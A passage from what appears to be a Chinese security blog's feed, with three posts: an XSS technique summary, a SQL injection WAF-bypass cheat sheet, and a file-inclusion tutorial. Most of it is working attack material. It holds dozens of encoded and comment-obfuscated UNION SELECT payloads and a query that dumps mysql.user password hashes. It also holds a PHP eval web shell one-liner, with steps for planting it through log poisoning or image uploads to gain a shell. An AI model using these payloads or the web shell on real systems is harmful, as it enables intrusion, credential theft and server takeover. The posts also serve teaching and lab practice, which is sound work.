class=\"markdownIt-Anchor\" href=\"#总结\">#</a> <span class=\"label\">总结</span></h4>\n<details class=\"info\"><summary>总结</summary><div>\n<div class=\"tab\" data-id=\"\" data-title=\"\">\n<ol>\n<li><code>无过滤机制：指的是在应用程序中没有对用户输入数据进行足够的过滤和验证，从而使恶意用户能够插入恶意代码，例如JavaScript，以攻击其他用户或应用程序。</code></li>\n<li><code>闭合标签：在HTML或XML中，攻击者尝试注入未经关闭的标签，以破坏文档结构或执行恶意代码。</code></li>\n<li><code>单引号闭合 + 添加事件：这是一种XSS攻击技术，攻击者尝试通过在HTML属性中插入单引号并添加JavaScript事件来执行恶意代码。</code></li>\n<li><code>双引号闭合 + 添加事件：类似于上面的攻击，但使用双引号来闭合属性，并添加JavaScript事件。</code></li>\n<li><code>双引号闭合 + 新建标签：攻击者尝试通过在HTML属性中插入双引号并创建新的HTML标签来执行恶意代码。</code></li>\n<li><code>大小写绕过：攻击者尝试通过在标签和属性名称中使用大小写混合来绕过安全过滤。</code></li>\n<li><code>双写绕过：攻击者尝试通过在标签或属性名称中使用双写来绕过安全过滤，例如使用&lt;sccript&gt;代替&lt;script&gt;。</code></li>\n<li><code>编码绕过：攻击者可能尝试使用编码或转义字符来绕过安全过滤，使浏览器执行恶意代码。</code></li>\n<li><code>检测关键字：安全过滤器通常会检查用户输入中的关键字，以识别和防止恶意代码注入。</code></li>\n<li><code>隐藏域打XSS：攻击者尝试通过在HTML表单的隐藏字段中插入恶意脚本来进行XSS攻击。</code></li>\n<li><code>Referer字段打XSS：攻击者可能会尝试通过伪造Referer字段的值来欺骗服务器，以执行XSS攻击。</code></li>\n<li><code>User-Agent字段打XSS：攻击者可能会伪造User-Agent字段，试图绕过安全措施以进行XSS攻击。</code></li>\n<li><code>Cookie字段打XSS：攻击者尝试通过在Cookie中注入恶意脚本来进行XSS攻击。</code></li>\n<li><code>代码不全做不了：指的是应用程序在接收到用户输入后没有足够的代码完整性检查，导致可能无法执行某些完整性要求的操作。</code></li>\n<li><code>ng-include 属性：这是AngularJS中的一个指令，如果不受控制地将用户提供的内容包含在ng-include中，可能会导致XSS攻击。</code></li>\n<li><code>空格实体转义：攻击者可能尝试通过将空格字符替换为HTML实体，来绕过安全过滤。</code></li>\n<li><code>embed参数拼接：攻击者尝试通过构造恶意的embed标签参数来执行XSS攻击。</code></li>\n</ol>\n</div>\n</div></details>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/",
            "url": "http://gyzero.shop/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/",
            "title": "sql注入绕过",
            "date_published": "2023-10-31T00:53:37.000Z",
            "content_html": "<p><span class=\"spoiler bulr\" title=\"...\">欢迎观看</span></p>\n<h3 id=\"大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#大小写绕过\">#</a> <span class=\"kbd\">大小写绕过</span></h3>\n<p class=\"rainbow\">将字符串设置为大小写，例如</p>\n<p class=\"rainbow\">and 1=1 转成 AND 1=1 AnD 1= 1</p>\n<p class=\"rainbow\">select * from users where id=1 UNION SELECT 1,2,3,4</p>\n<p class=\"rainbow\">select * from users where id=1 UniON SelECT 1,2,3,4</p>\n<h3 class=\"kbd\" id=\"浮点数绕过注入\"><a class=\"markdownIt-Anchor\" href=\"#浮点数绕过注入\">#</a> [浮点数绕过注入]</h3>\n<p class=\"rainbow\">select * from users where id=8E0union select 1,2,3,4; </p>\n<p class=\"rainbow\">select * from users where id=8.0union select  1,2,3,4</p>\n<h3 id=\"null-值绕-过\"><a class=\"markdownIt-Anchor\" href=\"#null-值绕-过\">#</a> <span class=\"kbd\">NULL 值绕 过</span></h3>\n<p class=\"rainbow\">select \\N;  \\N 代表空</p>\n<p class=\"rainbow\">select * from users where id=\\Nunion select 1,2,3,\\N;</p>\n<p class=\"rainbow\">select * from users where id=\\Nunion select 1,2,3,\\Nfrom users; </p>\n<h3 id=\"引号绕过\"><a class=\"markdownIt-Anchor\" href=\"#引号绕过\">#</a> <span class=\"kbd\">引号绕过  </span></h3>\n<p class=\"rainbow\">如果 waf 拦截过滤单引号的时候，可以使用双引号 在 mysql 里也可以用双引号作为字符串。</p>\n<p class=\"rainbow\">select * from users where id=‘1’;</p>\n<p class=\"rainbow\">select * from users where id=“1”; </p>\n<p class=\"rainbow\">也可以将字符串转换成 16 进制 再进行查询。</p>\n<p class=\"rainbow\">select hex(‘admin’); </p>\n<p class=\"rainbow\">select * from users where username=‘admin’;</p>\n<p class=\"rainbow\">select * from users where username=0x61646D696E; </p>\n<p class=\"rainbow\">如果 gpc 开启了，但是注入点是整形 也可以用 hex 十六进制进行绕过</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,(select group_concat(column_name) from {.rainbow}information_schema.columns where TABLE_NAME=‘users’ limit 1),4;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,(select group_concat(column_name) from {.rainbow}information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4;</p>\n<p class=\"rainbow\">可以看到存在整型注入的时候 没有用到单引号 所以可以注入</p>\n<h3 id=\"添加库名绕过\"><a class=\"markdownIt-Anchor\" href=\"#添加库名绕过\">#</a> <span class=\"kbd\">添加库名绕过 </span></h3>\n<p class=\"rainbow\">以下两条查询语句，执行的结果是一致的，但是有些 waf 的拦截规则 并不会拦截 [库名].[表名] 这种模式。</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,3,4 from users;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,3,4 from <span class=\"exturl\" data-url=\"aHR0cDovL2FkbWluLnVz\">admin.us</span> </p>\n<p class=\"rainbow\">mysql 中也可以添加库名查询表。例如跨库查询 mysql 库里的 usrs 表的内容。 select * from users where id=-1 union select 1,2,3,concat (user,authentication_string) from mysql.user;</p>\n<h3 id=\"去重复绕过\"><a class=\"markdownIt-Anchor\" href=\"#去重复绕过\">#</a> <span class=\"kbd\">去重复绕过  </span></h3>\n<p class=\"rainbow\">在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破 waf 拦截</p>\n<p class=\"rainbow\">select * from users where id=-1 union distinct select 1,2,3,4 from users;</p>\n<p class=\"rainbow\">select * from users where id=-1 union distinct select 1,2,3,version() from users; </p>\n<h3 id=\"反引号绕过\"><a class=\"markdownIt-Anchor\" href=\"#反引号绕过\">#</a> <span class=\"kbd\">反引号绕过  </span></h3>\n<p>在 mysql 可以使用  <code>这里是反引号</code>  绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。</p>\n<p class=\"rainbow\">insert into users(username,password,email)values(‘admin’,‘123456’,‘admin@admin.com’);</p>\n<p class=\"rainbow\">insert into users( <code>username</code> , <code>password</code> , <code>email</code> )values(‘admin’,‘123456’,‘admin@admin.com’); </p>\n<h3 id=\"脚本语言特性绕过\"><a class=\"markdownIt-Anchor\" href=\"#脚本语言特性绕过\">#</a> <span class=\"kbd\">脚本语言特性绕过</span></h3>\n<p class=\"rainbow\">在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一 些 waf 的拦截。</p>\n<p class=\"rainbow\">id=1%00&amp;id=2 union select 1,2,3</p>\n<p class=\"rainbow\">有些 waf 会去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了 程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截。 其他语言特性 </p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/jkjkjk.png\" alt=\"\"></p>\n<h3 id=\"逗号绕过\"><a class=\"markdownIt-Anchor\" href=\"#逗号绕过\">#</a> <span class=\"kbd\">逗号绕过  </span></h3>\n<p class=\"rainbow\">目前有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号</p>\n<p class=\"rainbow\">select * from users where id=1 union select 1,2,3,4;</p>\n<p class=\"rainbow\">一般会对逗号过滤成空 select * from users where id=1 union select 1 2 3 4; 这样 SQL 语句就会出错。 所以 可以不使用逗号进行 SQL </p>\n<h4 id=\"substr-截取字符串\"><a class=\"markdownIt-Anchor\" href=\"#substr-截取字符串\">#</a> <span class=\"kbd\">substr 截取字符串</span></h4>\n<p class=\"rainbow\">select(substr(database() from 1 for 1));</p>\n<p class=\"rainbow\">查询当前库第一个字符 查询 m 等于 select (substr (database () from 1 for 1)) 页面返回正常</p>\n<p class=\"rainbow\">select * from users where id=1 and ‘m’=(select(substr(database() from 1 for 1)));</p>\n<p class=\"rainbow\">可以进一步优化 m 换成 hex 0x6D 这样就避免了单引号</p>\n<p class=\"rainbow\">select * from users where id=1 and 0x6D=(select(substr(database() from 1 for 1))); </p>\n<h4 class=\"kbd\" id=\"min-截取字符串\"><a class=\"markdownIt-Anchor\" href=\"#min-截取字符串\">#</a> [min 截取字符串]</h4>\n<p class=\"rainbow\">这个 min 函数跟 substr 函数功能相同 如果 substr 函数被拦截或者过滤可以使用这个函数代替。</p>\n<p class=\"rainbow\">select mid (database () from 1 for 1); 这个方法如上。</p>\n<p class=\"rainbow\">select * from users where id=1 and ‘m’=(select(mid(database() from 1 for 1)));</p>\n<p class=\"rainbow\">select * from users where id=1 and 0x6D=(select(mid(database() from 1 for 1))); </p>\n<h4 id=\"使用-join-绕过\"><a class=\"markdownIt-Anchor\" href=\"#使用-join-绕过\">#</a> <span class=\"kbd\">使用 join 绕过 </span></h4>\n<p class=\"rainbow\">使用 join 自连接两个表 union select 1,2 #等价于 union select * from (select 1) a join (select 2) b a 和 b 分别是表的别名</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,3,4;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c join(select 4)d;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c join(select 4)d;</p>\n<p class=\"rainbow\">可以看到这里也没有使用逗号，从而绕过 waf </p>\n<h4 class=\"kbd\" id=\"like-绕过\"><a class=\"markdownIt-Anchor\" href=\"#like-绕过\">#</a> [like 绕过]</h4>\n<p class=\"rainbow\">使用 like 模糊查询 select user () like ‘% r%’; 模糊查询成功返回 1 否则返回 0 找到第一个字符后继续进行下一个字符匹配。从而找到所有的字符串 最后就是要查询的内容，这种 SQL 注 入语句也不会存在逗号。从而绕过 waf 拦截 </p>\n<h4 id=\"limit-offset-绕过\"><a class=\"markdownIt-Anchor\" href=\"#limit-offset-绕过\">#</a> <span class=\"kbd\">limit offset 绕过 </span></h4>\n<p class=\"rainbow\">SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1 返回条一条记录 如果 对逗号进行拦截时，可以使用 limit 1 默认返回第一条数据。也可以使用 limit 1 offset 0 从零开始返 回第一条记录，这样就绕过 waf </p>\n<h3 class=\"kbd\" id=\"or-and-xor-not-绕过\"><a class=\"markdownIt-Anchor\" href=\"#or-and-xor-not-绕过\">#</a> [or and xor not 绕过]</h3>\n<p class=\"rainbow\">目前主流的 waf 都会对 id=1 and 1=2、id=1 or 1=2、id=0 or 1=2 id=0 xor 1=1 limit 1 、id=1 xor 1=2 对这些常见的 SQL 注入检测语句进行拦截。像 and 这些还有字符代替 字符如下 </p>\n<p class=\"rainbow\">and 等于 &amp;&amp;</p>\n<p class=\"rainbow\">or 等于 ||</p>\n<p class=\"rainbow\">not 等于！</p>\n<p class=\"rainbow\">xor 等于 |</p>\n<p class=\"rainbow\">所以可以转换成这样</p>\n<p class=\"rainbow\">id=1 and 1=1 等于 id=1 &amp;&amp; 1=1</p>\n<p class=\"rainbow\">id=1 and 1=2 等于 id=1 &amp;&amp; 1=2</p>\n<p class=\"rainbow\">id=1 or 1=1 等于 id=1 || 1=1</p>\n<p class=\"rainbow\">id=0 or 1=0 等于   id=0 || 1=0 </p>\n<p class=\"rainbow\">可以绕过一些 waf 拦截继续对注入点进行安全检测</p>\n<p class=\"rainbow\">也可以使用运算符号</p>\n<p class=\"rainbow\">id=1 &amp;&amp; 2=1+1</p>\n<p class=\"rainbow\">id=1 &amp;&amp;   2=1-1 </p>\n<h3 id=\"ascii-字符对比绕过\"><a class=\"markdownIt-Anchor\" href=\"#ascii-字符对比绕过\">#</a> <span class=\"kbd\">ascii 字符对比绕过 </span></h3>\n<p class=\"rainbow\">许多 waf 会对 union select 进行拦截 而且通常比较变态，那么可以不使用联合查询注入，可以使用字符 截取对比法，进行突破。</p>\n<p class=\"rainbow\">select substring(user(),1,1);</p>\n<p class=\"rainbow\">select * from users where id=1 and substring(user(),1,1)=‘r’;</p>\n<p class=\"rainbow\">select * from users where id=1 and ascii(substring(user(),1,1))=114;</p>\n<p class=\"rainbow\">最好把’r’换成成 ascii 码 如果开启 gpc int 注入就不能用了。 可以看到构造得 SQL 攻击语句没有使用联合查询 (union select) 也可以把数据查询出来 </p>\n<h3 class=\"kbd\" id=\"等号绕过\"><a class=\"markdownIt-Anchor\" href=\"#等号绕过\">#</a> [等号绕过]</h3>\n<p class=\"rainbow\">如果程序会对 = 进行拦截 可以使用 like rlike regexp 或者使用 &lt;或者&gt;</p>\n<p class=\"rainbow\">select * from users where id=1 and ascii(substring(user(),1,1))&lt;115;</p>\n<p class=\"rainbow\">select * from users where id=1 and ascii(substring(user(),1,1))&gt;115;</p>\n<p class=\"rainbow\">select * from users where id=1 and (select substring(user(),1,1)like ‘r%’);</p>\n<p class=\"rainbow\">select * from users where id=1 and (select substring(user(),1,1)rlike ‘r’) </p>\n<p class=\"rainbow\">select * from users where id=1 and 1=(select user() regexp ‘^r’);</p>\n<p class=\"rainbow\">select * from users where id=1 and 1=(select user() regexp ‘^a’);</p>\n<p class=\"rainbow\">regexp 后面是正则 </p>\n<h3 class=\"kbd\" id=\"双关键词绕过\"><a class=\"markdownIt-Anchor\" href=\"#双关键词绕过\">#</a> [双关键词绕过]</h3>\n<p class=\"rainbow\">有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患。 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）</p>\n<p class=\"rainbow\">id=-1’UNIunionONSeLselectECT1,2,3–+ 到数据库里执行会变成 id=-1’UNION SeLECT1,2,3–+ 从而绕过注入 </p>\n<h3 id=\"union-select-绕过\"><a class=\"markdownIt-Anchor\" href=\"#union-select-绕过\">#</a> <span class=\"kbd\">union select 绕过 </span></h3>\n<p class=\"rainbow\">目前不少 waf 都会使用都会对 union select 进行拦截 单个不拦截 一起就进行拦截。</p>\n<p class=\"rainbow\">针对单个关键词绕过 sel&lt;&gt;ect 程序过滤 &lt;&gt; 为空 脚本处理</p>\n<p class=\"rainbow\">sele/<strong>/ct 程序过滤 /</strong>/ 为空</p>\n<p class=\"rainbow\">/<em>!%53eLEct</em>/url 编码与内联注释</p>\n<p class=\"rainbow\">se%0blect 使用空格绕过</p>\n<p class=\"rainbow\">sele% ct 使用百分号绕过</p>\n<p class=\"rainbow\">%53eLEct 编码绕过</p>\n<p class=\"rainbow\">大小写</p>\n<p class=\"rainbow\">uNIoN sELecT 1,2</p>\n<p class=\"rainbow\">union all select 1,2</p>\n<p class=\"rainbow\">union DISTINCT select 1,2</p>\n<p class=\"rainbow\">null+UNION+SELECT+1,2</p>\n<p class=\"rainbow\">/<em>!union</em>//<em>!select</em>/1,2</p>\n<p class=\"rainbow\">union/<strong>/select/</strong>/1,2</p>\n<p class=\"rainbow\">and(select 1)=(Select 0xA<em>1000)/</em>!uNIOn*//<em>!SeLECt</em>/ 1,user() </p>\n<p class=\"rainbow\">/<em>!50000union</em>//<em>!50000select</em>/1,2</p>\n<p class=\"rainbow\">/<em>!40000union</em>//<em>!40000select</em>/1,2</p>\n<p class=\"rainbow\">%0aunion%0aselect 1,2</p>\n<p class=\"rainbow\">%250aunion%250aselect 1,2</p>\n<p class=\"rainbow\">%09union%09select 1,2</p>\n<p class=\"rainbow\">%0caunion%0cselect 1,2</p>\n<p class=\"rainbow\">%0daunion%0dselect 1,2</p>\n<p class=\"rainbow\">%0baunion%0bselect 1,2</p>\n<p class=\"rainbow\">%0d%0aunion%0d%0aselect 1,2</p>\n<p class=\"rainbow\">–+%0d%0aunion–+%0d%0aselect–+%0d%0a1,–+%0d%0a2 /<em>!12345union</em>//<em>!12345select</em>/1,2;</p>\n<p class=\"rainbow\">/<em> 中文</em> /union/<em> 中文</em> /select/<em> 中文</em> / 1,2;</p>\n<p class=\"rainbow\">/* <em>/union/</em> */select/ */1,2;</p>\n<p class=\"rainbow\">/<em>!union</em>//<em>!00000all</em>//<em>!00000select</em>/1,2 </p>\n<h3 id=\"unicode-编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#unicode-编码绕过\">#</a> <span class=\"kbd\">Unicode 编码绕过 </span></h3>\n<p class=\"rainbow\">形式：“\\u” 或者是 “% u” 加上 4 位 16 进制 Unicode 码值。</p>\n<p class=\"rainbow\">iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码</p>\n<p class=\"rainbow\">-1 union select 1,user()</p>\n<p class=\"rainbow\">部分转码</p>\n<p class=\"rainbow\">-1 uni%u006fn sel%u0065ct 1,user()</p>\n<p class=\"rainbow\">全部转码 {.rainbow}% u002d% u0031% u0020% u0075% u006e% u0069% u006f% u006e% u0020% u0073% u0065% u006c% u0065% u0063% u0074% u 0020% u0031% u002c% u0075% u0073% u0065% u0072% u0028% u0029 </p>\n<h3 id=\"url-编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#url-编码绕过\">#</a> <span class=\"kbd\">url 编码绕过 </span></h3>\n<p>在 iis 里会自动把 url 编码转换成字符串传到程序中执行。 例如 union select 可以转换成 u%6eion s%65lect  94</p>\n<p class=\"rainbow\">POST /06/vul/sqli/sqli_id.php</p>\n<p class=\"rainbow\">HTTP/1.1 Host: 192.168.0.165</p>\n<p class=\"rainbow\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: {.rainbow}text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</p>\n<p class=\"rainbow\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p>\n<p class=\"rainbow\">Accept-Encoding: gzip, deflate</p>\n<p class=\"rainbow\">Content-Type: application/x-www-form-urlencoded</p>\n<p class=\"rainbow\">Content-Length: 47</p>\n<p class=\"rainbow\">Origin: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjU=\">http://192.168.0.165</span></p>\n<p class=\"rainbow\">Connection: close Referer: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjUvMDYvdnVsL3NxbGkvc3FsaV9pZC5waHA=\">http://192.168.0.165/06/vul/sqli/sqli_id.php</span></p>\n<p class=\"rainbow\">Cookie: PHPSESSID=hk8r159en71pndlu3jvvphenn5</p>\n<p class=\"rainbow\">Upgrade-Insecure-Requests: 1</p>\n<p class=\"rainbow\">id=-1 union%25OAselect%25OA1,user()-- &amp;submit=1</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "url": "http://gyzero.shop/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "title": "文件包含漏洞",
            "date_published": "2023-10-30T14:15:36.000Z",
            "content_html": "<p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的网络安全漏洞，通常发生在 web 应用程序中。这种漏洞允许攻击者在应用程序中包含、执行或显示本不应该被访问的文件内容。文件包含漏洞通常发生在以下两种情况中：</p>\n<ol>\n<li>本地文件包含（Local File Inclusion，LFI）：攻击者通过构造恶意请求，使应用程序包含本地文件系统上的文件，通常是敏感文件。这些文件可以包括密码文件、配置文件、日志文件等，泄露敏感信息或执行恶意代码。攻击者通常通过修改 URL 参数或请求头来实施这种攻击。</li>\n<li>远程文件包含（Remote File Inclusion，RFI）：攻击者利用应用程序允许包含远程文件的漏洞，将恶意代码包含到应用程序中，以执行攻击者控制的代码。通常，攻击者提供一个远程 URL，应用程序会下载并执行其中的内容。</li>\n<li>输入验证和过滤：确保应用程序对用户提供的文件路径或 URL 进行适当的输入验证和过滤，以防止包含恶意文件或路径。</li>\n<li>使用白名单：仅允许应用程序包含已知可信的文件或路径，而不是黑名单，因为黑名单可能不完全，无法覆盖所有潜在的攻击。</li>\n<li>隔离文件系统权限：确保应用程序运行在具有最小权限的帐户上，以减少攻击者获取访问文件系统的机会。</li>\n<li>定期更新和维护应用程序：确保应用程序和相关组件都是最新的，以修复已知的漏洞。</li>\n<li>安全编程实践：开发人员应当采用安全编程实践，避免将用户提供的输入直接用于文件包含操作，尤其是未经适当验证和过滤的输入。</li>\n<li>使用 Web 应用程序防火墙（WAF）：WAF 可以帮助检测和阻止文件包含漏洞等攻击。</li>\n</ol>\n<h3 id=\"常见文件包含函数\"><a class=\"markdownIt-Anchor\" href=\"#常见文件包含函数\">#</a> <strong>常见文件包含函数</strong></h3>\n<ul>\n<li>PHP：</li>\n<li>include (): 用于将文件包含到 PHP 脚本中。如果包含的文件不存在，它会产生警告，但脚本会继续执行。</li>\n<li>require (): 与 include () 类似，但如果包含的文件不存在，它会产生致命错误，停止脚本执行。</li>\n<li>include_once (): 用于包含文件，但只包含一次，以防止重复包含。</li>\n<li>require_once (): 与 include_once () 类似，但只包含一次，并且如果文件不存在会产生致命错误。</li>\n<li>Python：</li>\n<li>execfile (): 用于执行 Python 文件。可以将外部文件的代码动态执行在当前环境中。</li>\n<li>import: 用于导入其他 Python 模块。这通常更安全，因为 Python 的导入系统有内置的安全性。</li>\n</ul>\n<h3 id=\"代码分析\"><a class=\"markdownIt-Anchor\" href=\"#代码分析\">#</a> 代码分析</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$html</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"include/<span class=\"token interpolation\"><span class=\"token variable\">$filename</span></span>\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 变量传进来直接包含，没做任何的安全限制</span></pre></td></tr></table></figure><ul>\n<li>\n<p>本地文件包含 - 包含本地的文件</p>\n</li>\n<li>\n<p>本地有一个 shell 文件内容是 &lt;?php phpinfo ();eval ($_POST [‘cmd’]);&gt;</p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/image.png\" alt=\"\"></p>\n</li>\n<li>\n<p>传入参数去包含 shell,…/ 是表示上目录，查找有没有这个文件如果有的话就包含这个文件执行里面的</p>\n</li>\n<li>\n<p>php 代码如果是不可执行的话返回内容</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/3.png\" alt=\"\"></p>\n<ul>\n<li>配合图片马使用也是可以包含执行的</li>\n<li>上传图片马然后用蚂蚁剑连</li>\n</ul>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/4.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/5.png\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"包含日志文件进行getshell\"><a class=\"markdownIt-Anchor\" href=\"#包含日志文件进行getshell\">#</a> 包含日志文件进行 getshell</h3>\n<p>常见的中间件和服务器日志文件的默认路径可以因软件版本、操作系统和配置而异，但通常以下是一些常见的默认日志文件路径：</p>\n<ol>\n<li>Apache HTTP Server:</li>\n</ol>\n<ul>\n<li>\n<p>错误日志文件: /var/log/apache2/error.log (Debian/Ubuntu) 或 /var/log/httpd/error_log (CentOS/RHEL)</p>\n<p>访问日志文件: /var/log/apache2/access.log (Debian/Ubuntu) 或 /var/log/httpd/access_log (CentOS/RHEL)</p>\n</li>\n</ul>\n<ol>\n<li>\n<p>Nginx:</p>\n</li>\n<li>\n<p>错误日志文件: /var/log/nginx/error.log</p>\n</li>\n<li>\n<p>访问日志文件: /var/log/nginx/access.log</p>\n</li>\n<li>\n<p>Tomcat:</p>\n</li>\n</ol>\n<ul>\n<li>\n<p>错误日志文件:$CATALINA_BASE/logs/catalina.out（通常在 catalina.out 或 catalina.log 文件中）</p>\n<p>访问日志文件: $CATALINA_BASE/logs/access_log</p>\n</li>\n</ul>\n<ol>\n<li>错误日志：</li>\n</ol>\n<ul>\n<li>默认情况下，IIS 的错误日志通常位于 % SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC#\\ 目录中，其中 ** <strong>#</strong> ** 代表站点的唯一 ID。通常，这个目录中会有多个子目录，每个子目录对应一个不同的站点。</li>\n</ul>\n<ol>\n<li>访问日志：</li>\n</ol>\n<ul>\n<li>访问日志通常也存储在与错误日志相同的目录中，即 % SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC#。这里的 # 仍然代表站点的唯一 ID。通常，访问日志文件以 u_exYYMMDD.log 格式的方式命名，其中 YYMMDD 代表日期。</li>\n</ul>\n<ol>\n<li>用 burp 抓包然后把提交的参数写成一句话木马<?php phpinfo();eval($_POST['cmd']);?></li>\n<li>然后 apache 服务器日志里会有这样的记录 127.0.0.1 - - [30/Oct/2023:17:51:19 +0800] “GET /vul/fileinclude/fi_local.php?filename=<?php phpinfo();eval($_POST['cmd']);?>&amp;submit=% E6%8F%90% E4% BA% A4% E6%9F% A5% E8% AF% A2” 400 2220 里会有我们刚才提交的一句话木马，然后用文件包含去包含</li>\n<li>这个日志文件里面的一句话就会被执行错误日志也可以（前提是要有权限）</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/7.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/8.png\" alt=\"\"></p>\n<h3 id=\"配合文件上传漏洞getshell\"><a class=\"markdownIt-Anchor\" href=\"#配合文件上传漏洞getshell\">#</a> 配合文件上传漏洞 getshell</h3>\n<p>文件上传一个 txt 文本或者图片里面添加一句话木马</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/10.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/11.png\" alt=\"\"></p>\n<h3 id=\"伪协议\"><a class=\"markdownIt-Anchor\" href=\"#伪协议\">#</a> 伪协议</h3>\n<ol>\n<li>file://:</li>\n</ol>\n<ul>\n<li>用于访问本地文件系统中的文件。在文件包含漏洞攻击中，攻击者可能尝试使用这个协议来包含恶意文件。</li>\n</ul>\n<ol>\n<li>http:// 和 https://:</li>\n</ol>\n<ul>\n<li>用于访问 HTTP 和 HTTPS URL 资源。这些协议通常用于从 Web 服务器上获取数据。</li>\n</ul>\n<ol>\n<li>ftp:// 和 ftps://:</li>\n</ol>\n<ul>\n<li>用于访问 FTP 和 FTPS URLs，可以用于上传和下载文件。</li>\n</ul>\n<ol>\n<li>php://:</li>\n</ol>\n<ul>\n<li>用于访问各种输入 / 输出流，如 php://input 和 php://output，在 PHP 中执行文件操作时非常有用。</li>\n</ul>\n<ol>\n<li>zlib://:</li>\n</ol>\n<ul>\n<li>用于压缩和解压缩流。</li>\n</ul>\n<ol>\n<li>data://:</li>\n</ol>\n<ul>\n<li>用于处理数据 URL，允许将数据直接嵌入到 URL 中。</li>\n</ul>\n<ol>\n<li>glob://:</li>\n</ol>\n<ul>\n<li>用于查找匹配的文件路径模式，通常用于文件操作。</li>\n</ul>\n<ol>\n<li>phar://:</li>\n</ol>\n<ul>\n<li>用于处理 PHP 归档文件，通常用于包含 PHP 库和资源。</li>\n</ul>\n<ol>\n<li>ssh2://:</li>\n</ol>\n<ul>\n<li>用于 SSH2 协议，可用于安全的 Shell 